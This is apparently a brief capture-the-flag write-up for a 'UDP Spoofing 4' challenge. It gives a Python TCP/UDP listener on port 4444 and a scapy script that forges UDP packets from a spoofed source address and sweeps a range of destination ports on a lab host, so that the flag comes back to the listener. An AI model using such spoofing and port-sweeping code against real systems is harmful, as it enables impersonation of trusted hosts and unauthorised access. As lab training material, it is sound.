# UDP Spoofing 4

#### As normal I started to overcomplicate what was needed and realized that the code from last challenge would work with zero changes.

```python
import socket
import select
import sys

LISTEN_IP = "0.0.0.0" 
LISTEN_PORT = 4444
BUFFER_SIZE = 4096

udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
udp_sock.bind((LISTEN_IP, LISTEN_PORT))
print(f"[*] Listening for UDP on {LISTEN_IP}:{LISTEN_PORT}")

tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
tcp_sock.bind((LISTEN_IP, LISTEN_PORT))
tcp_sock.listen(5)
print(f"[*] Listening for TCP on {LISTEN_IP}:{LISTEN_PORT}")

sockets_list = [udp_sock, tcp_sock]

print("[*] Waiting for data (TCP or UDP)...")

while True:
    read_sockets, _, _ = select.select(sockets_list, [], [])

    for notified_socket in read_sockets:
        if notified_socket == tcp_sock:
            conn, addr = tcp_sock.accept()
            data = conn.recv(BUFFER_SIZE)
            if data:
                print(f"\n[+] TCP Connection from {addr[0]}:{addr[1]}")
                print(f"[+] Message: {data.decode('utf-8').strip()}")
            conn.close()
            
        else:
            data, addr = notified_socket.recvfrom(BUFFER_SIZE)
            print(f"\n[+] UDP Datagram from {addr[0]}:{addr[1]}")
            print(f"[+] Message: {data.decode('utf-8').strip()}")
```

```python
from scapy.all import *

src_ip = "10.0.0.3"
sport = 31337
dst_ip = "10.0.0.2"
#dport = 31338
msg = "FLAG:10.0.0.1:4444"

for ports in range(32768, 61000):
    packet = IP(src=src_ip, dst=dst_ip) / UDP(sport=sport, dport=ports) / Raw(load=msg)
#print(f"Sending packet: {packet.summary()}")
    send(packet, verbose=0)
'''
if response:
    response.show() 
    if Raw in response:
        print(f"\nResponse: {response[Raw].load.decode('utf-8')}")
else:
    print("\nNo response received.")
'''
```

<img width="412" height="136" alt="Screenshot 2025-11-05 135308" src="https://github.com/user-attachments/assets/3ce5a20a-3fa8-443c-bba5-63945e1f1f9b" />
